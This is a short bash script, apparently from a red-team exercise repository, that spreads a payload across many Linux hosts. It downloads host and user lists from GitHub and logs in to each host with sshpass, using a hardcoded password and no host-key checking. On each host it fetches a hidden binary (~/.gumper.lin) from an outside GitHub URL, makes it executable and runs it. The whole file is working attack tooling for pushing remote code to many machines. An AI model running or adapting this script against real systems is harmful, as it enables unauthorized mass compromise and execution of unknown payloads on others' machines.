#!/bin/bash

USER_FILE="linux.txt"
CURL_COMMAND="curl -s -o ~/.gumper.lin https://github.com/CyberLions/fortnite-the-video-game-parenthesis-the-town-parenthesis/raw/main/red-scripts/payloads/gumper.lin; chmod +x ~/.gumper.lin"
EXECUTE_COMMAND="~/.gumper.lin"

SSH_PASSWORD="Change.me123!"

curl -o linux.txt https://raw.githubusercontent.com/CyberLions/fortnite-the-video-game-parenthesis-the-town-parenthesis/main/hosts/linux.txt
curl -o users.txt https://raw.githubusercontent.com/CyberLions/fortnite-the-video-game-parenthesis-the-town-parenthesis/main/users.txt

if [ ! -f "$USER_FILE" ]; then
    echo "The file $USER_FILE does not exist."
    exit 1
fi

while IFS= read -r line
do
    sshpass -p "$SSH_PASSWORD" ssh -o StrictHostKeyChecking=no "$line" "$CURL_COMMAND"
    sshpass -p "$SSH_PASSWORD" ssh -o StrictHostKeyChecking=no "$line" "$EXECUTE_COMMAND"
done < "$USER_FILE"

